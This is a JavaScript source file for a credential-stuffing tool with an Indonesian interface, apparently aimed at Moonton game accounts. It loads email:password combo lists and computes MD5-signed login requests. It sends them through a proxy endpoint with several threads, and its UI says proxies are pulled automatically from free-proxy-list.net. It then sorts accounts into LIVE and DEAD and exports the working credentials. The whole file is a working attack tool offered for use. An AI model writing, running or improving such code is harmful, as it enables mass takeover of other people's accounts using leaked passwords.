function md5(s){function r(n){var s='';for(var j=0;j<4;j++)s+='0123456789abcdef'.charAt((n>>(j*8+4))&0x0f)+'0123456789abcdef'.charAt((n>>(j*8))&0x0f);return s;}function sa(x,y){var l=(x&0xffff)+(y&0xffff);return((x>>16)+(y>>16)+(l>>16)<<16)|(l&0xffff);}function rl(n,c){return(n<<c)|(n>>>(32-c));}function cm(q,a,b,x,s,t){return sa(rl(sa(sa(a,q),sa(x,t)),s),b);}function ff(a,b,c,d,x,s,t){return cm((b&c)|(~b&d),a,b,x,s,t);}function gg(a,b,c,d,x,s,t){return cm((b&d)|(c&~d),a,b,x,s,t);}function hh(a,b,c,d,x,s,t){return cm(b^c^d,a,b,x,s,t);}function ii(a,b,c,d,x,s,t){return cm(c^(b|~d),a,b,x,s,t);}var str=unescape(encodeURIComponent(s)),l=str.length,n=((l+8)>>>6<<4)+16,S=[];for(var i=0;i<n;i++)S[i]=0;for(i=0;i<l;i++)S[i>>2]|=str.charCodeAt(i)<<((i%4)<<3);S[i>>2]|=0x80<<((i%4)<<3);S[n-2]=l<<3;S[n-1]=l>>>29;var a=1732584193,b=-271733879,c=-1732584194,d=271733878;for(i=0;i<n;i+=16){var oA=a,oB=b,oC=c,oD=d,M=S.slice(i,i+16);a=ff(a,b,c,d,M[0],7,-680876936);d=ff(d,a,b,c,M[1],12,-389564586);c=ff(c,d,a,b,M[2],17,606105819);b=ff(b,c,d,a,M[3],22,-1044525330);a=ff(a,b,c,d,M[4],7,-176418897);d=ff(d,a,b,c,M[5],12,1200080426);c=ff(c,d,a,b,M[6],17,-1473231341);b=ff(b,c,d,a,M[7],22,-45705983);a=ff(a,b,c,d,M[8],7,1770035416);d=ff(d,a,b,c,M[9],12,-1958414417);c=ff(c,d,a,b,M[10],17,-42063);b=ff(b,c,d,a,M[11],22,-1990404162);a=ff(a,b,c,d,M[12],7,1804603682);d=ff(d,a,b,c,M[13],12,-40341101);c=ff(c,d,a,b,M[14],17,-1502002290);b=ff(b,c,d,a,M[15],22,1236535329);a=gg(a,b,c,d,M[1],5,-165796510);d=gg(d,a,b,c,M[6],9,-1069501632);c=gg(c,d,a,b,M[11],14,643717713);b=gg(b,c,d,a,M[0],20,-373897302);a=gg(a,b,c,d,M[5],5,-701558691);d=gg(d,a,b,c,M[10],9,38016083);c=gg(c,d,a,b,M[15],14,-660478335);b=gg(b,c,d,a,M[4],20,-405537848);a=gg(a,b,c,d,M[9],5,568446438);d=gg(d,a,b,c,M[14],9,-1019803690);c=gg(c,d,a,b,M[3],14,-187363961);b=gg(b,c,d,a,M[8],20,1163531501);a=gg(a,b,c,d,M[13],5,-1444681467);d=gg(d,a,b,c,M[2],9,-51403784);c=gg(c,d,a,b,M[7],14,1735328473);b=gg(b,c,d,a,M[12],20,-1926607734);a=hh(a,b,c,d,M[5],4,-378558);d=hh(d,a,b,c,M[8],11,-2022574463);c=hh(c,d,a,b,M[11],16,1839030562);b=hh(b,c,d,a,M[14],23,-35309556);a=hh(a,b,c,d,M[1],4,-1530992060);d=hh(d,a,b,c,M[4],11,1272893353);c=hh(c,d,a,b,M[7],16,-155497632);b=hh(b,c,d,a,M[10],23,-1094730640);a=hh(a,b,c,d,M[13],4,681279174);d=hh(d,a,b,c,M[0],11,-358537222);c=hh(c,d,a,b,M[3],16,-722521979);b=hh(b,c,d,a,M[6],23,76029189);a=hh(a,b,c,d,M[9],4,-640364487);d=hh(d,a,b,c,M[12],11,-421815835);c=hh(c,d,a,b,M[15],16,530742520);b=hh(b,c,d,a,M[2],23,-995338651);a=ii(a,b,c,d,M[0],6,-198630844);d=ii(d,a,b,c,M[7],10,1126891415);c=ii(c,d,a,b,M[14],15,-1416354905);b=ii(b,c,d,a,M[5],21,-57434055);a=ii(a,b,c,d,M[12],6,1700485571);d=ii(d,a,b,c,M[3],10,-1894986606);c=ii(c,d,a,b,M[10],15,-1051523);b=ii(b,c,d,a,M[1],21,-2054922799);a=ii(a,b,c,d,M[8],6,1873313359);d=ii(d,a,b,c,M[15],10,-30611744);c=ii(c,d,a,b,M[6],15,-1560198380);b=ii(b,c,d,a,M[13],21,1309151649);a=ii(a,b,c,d,M[4],6,-145523070);d=ii(d,a,b,c,M[11],10,-1120210379);c=ii(c,d,a,b,M[2],15,718787259);b=ii(b,c,d,a,M[9],21,-343485551);a=sa(a,oA);b=sa(b,oB);c=sa(c,oC);d=sa(d,oD);}return r(a)+r(b)+r(c)+r(d);}

const ST = { accounts:[], res:{live:[],die:[]}, processed:0, running:false, stop:false };
let curTab = 'all';

function goPage(name) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.ni').forEach(b => b.classList.remove('active'));
  G('pg-' + name).classList.add('active');
  G('ni-' + name).classList.add('active');
  if (name === 'results') renderRes();
}

function G(id) { return document.getElementById(id); }

G('tSl').addEventListener('input', () => G('tV').textContent = G('tSl').value);

const dz = G('dropZ');
G('fInput').addEventListener('change', e => { if (e.target.files[0]) loadFile(e.target.files[0]); });
dz.addEventListener('dragover', e => { e.preventDefault(); dz.classList.add('over'); });
dz.addEventListener('dragleave', () => dz.classList.remove('over'));
dz.addEventListener('drop', e => { e.preventDefault(); dz.classList.remove('over'); if (e.dataTransfer.files[0]) loadFile(e.dataTransfer.files[0]); });

function loadFile(f) {
  if (!f.name.endsWith('.txt')) { showToast('File harus berformat .txt'); return; }
  const r = new FileReader();
  r.onload = ev => {
    ST.accounts = [];
    for (const line of ev.target.result.split(/\r?\n/)) {
      const tr = line.trim(); if (!tr) continue;
      const p = tr.includes('|') ? tr.split('|') : tr.split(':');
      if (p.length >= 2 && p[0].trim() && p[1].trim())
        ST.accounts.push({ email: p[0].trim(), pw: p[1].trim(), raw: tr });
    }
    if (!ST.accounts.length) { showToast('Tidak ada akun valid ditemukan'); return; }
    G('fname').textContent = f.name + '  [' + ST.accounts.length + ' akun]';
    G('fname').style.display = 'block';
    G('sT').textContent = ST.accounts.length;
    G('sL').textContent = '0'; G('sD').textContent = '0';
    G('pb').style.width = '0%'; G('pt').textContent = '0 / ' + ST.accounts.length;
    G('btnGo').disabled = false;
    addLog('info', 'LOAD', ST.accounts.length + ' akun dimuat dari ' + esc(f.name));
  };
  r.readAsText(f);
}

function addLog(type, badge, msg) {
  const box = G('logB');
  G('logE').style.display = 'none';
  const el = document.createElement('div');
  el.className = 'le';
  el.innerHTML = `<div class="lb ${type}">${badge}</div><div class="lm">${msg}</div>`;
  box.appendChild(el);
  box.scrollTop = box.scrollHeight;
}

function buildParams(acc) {
  const md5pwd = md5(acc.pw);
  const sign = md5('account=' + acc.email + '&md5pwd=' + md5pwd + '&op=login');
  return JSON.stringify({ op: 'login', sign, params: { account: acc.email, md5pwd }, lang: 'cn' });
}

async function checkAcc(acc) {
  const body = buildParams(acc);
  try {
    const res = await fetch('/api/moonton-proxy', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body
    });
    const data = await res.json();
    if (data.message === 'Error_Success') return { ok: true };
    return { ok: false, msg: data.message || 'Login gagal' };
  } catch (err) {
    return { ok: false, msg: 'Server error: ' + (err.message || 'network') };
  }
}

G('btnGo').addEventListener('click', runChecker);
G('btnHalt').addEventListener('click', () => {
  ST.stop = true;
  G('btnHalt').disabled = true;
  addLog('warn', 'STOP', 'Menghentikan proses...');
});

async function runChecker() {
  if (!ST.accounts.length) return;
  ST.res = { live: [], die: [] };
  ST.processed = 0; ST.running = true; ST.stop = false;

  G('logB').innerHTML = ''; G('logE').style.display = 'none';
  G('sL').textContent = '0'; G('sD').textContent = '0';
  setBadge(0);
  G('btnGo').disabled = true; G('btnHalt').disabled = false;
  setStatus('run', 'RUNNING');
  G('pxInfo').innerHTML = 'Mode: <span>Server Proxy</span> — proxy diambil otomatis dari free-proxy-list.net';

  const threads = parseInt(G('tSl').value);
  const total = ST.accounts.length;
  addLog('info', 'START', 'Memulai ' + total + ' akun dengan ' + threads + ' thread...');

  const queue = [...ST.accounts];

  async function worker() {
    while (queue.length && !ST.stop) {
      const acc = queue.shift(); if (!acc) break;
      const r = await checkAcc(acc);
      ST.processed++;

      if (r.ok) {
        ST.res.live.push({ acc: acc.raw, time: new Date().toLocaleTimeString() });
        addLog('live', 'LIVE', esc(acc.raw));
      } else {
        ST.res.die.push({ acc: acc.raw, time: new Date().toLocaleTimeString() });
        const isFail = r.msg && (r.msg.includes('gagal') || r.msg.startsWith('Error'));
        addLog(isFail ? 'dead' : 'err', isFail ? 'DEAD' : 'ERR', esc(acc.raw) + (r.msg ? ' &mdash; ' + esc(r.msg) : ''));
      }

      G('sL').textContent = ST.res.live.length;
      G('sD').textContent = ST.res.die.length;
      const pct = Math.round((ST.processed / total) * 100);
      G('pb').style.width = pct + '%';
      G('pt').textContent = ST.processed + ' / ' + total;
      setBadge(ST.res.live.length);
    }
  }

  await Promise.all(Array.from({ length: threads }, worker));

  ST.running = false;
  G('btnGo').disabled = false; G('btnHalt').disabled = true;
  setStatus(ST.stop ? 'stop' : 'done', ST.stop ? 'STOPPED' : 'DONE');
  addLog('info', 'DONE', 'Selesai. LIVE: ' + ST.res.live.length + ' | DEAD: ' + ST.res.die.length);
}

function setTab(t) {
  curTab = t;
  document.querySelectorAll('.tab').forEach(b => {
    b.className = 'tab';
    if (b.dataset.t === t) b.classList.add(t === 'all' ? 'ta' : t === 'live' ? 'tl' : 'td');
  });
  renderRes();
}

function renderRes() {
  const list = G('rl');
  let items = [];
  if (curTab === 'live')    items = ST.res.live.map(r => ({ ...r, type: 'live' }));
  else if (curTab === 'die') items = ST.res.die.map(r => ({ ...r, type: 'dead' }));
  else items = [...ST.res.live.map(r => ({ ...r, type: 'live' })), ...ST.res.die.map(r => ({ ...r, type: 'dead' }))];

  if (!items.length) {
    list.innerHTML = '<div class="no-r"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>Belum ada hasil</div>';
    return;
  }

  list.innerHTML = items.map(it => `
    <div class="ri ${it.type}">
      <div class="ri-top">
        <div class="ri-acc">${esc(it.acc)}</div>
        <div class="ri-st ${it.type}">${it.type === 'live' ? 'LIVE' : 'DEAD'}</div>
      </div>
      <div class="ri-time">${it.time}</div>
    </div>
  `).join('');
}

function dlR(type) {
  const items = ST.res[type];
  if (!items.length) { showToast('Tidak ada data ' + type); return; }
  const blob = new Blob([items.map(r => r.acc).join('\n')], { type: 'text/plain' });
  const a = document.createElement('a'); a.href = URL.createObjectURL(blob);
  a.download = type + '.txt'; a.click();
  showToast('Mengunduh ' + type + '.txt');
}

function cpAll() {
  const all = [...ST.res.live, ...ST.res.die].map(r => r.acc).join('\n');
  if (!all) { showToast('Tidak ada data'); return; }
  navigator.clipboard.writeText(all).then(() => showToast('Disalin ke clipboard')).catch(() => showToast('Gagal menyalin'));
}

function esc(s) { return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }

function setStatus(cls, txt) {
  G('dot').className = 'dot ' + cls;
  G('stxt').textContent = txt;
}

function setBadge(n) {
  const b = G('nb');
  if (n > 0) { b.style.display = 'flex'; b.textContent = n > 99 ? '99+' : n; }
  else b.style.display = 'none';
}

function showToast(msg) {
  const t = G('toast'); t.textContent = msg; t.classList.add('on');
  setTimeout(() => t.classList.remove('on'), 2400);
}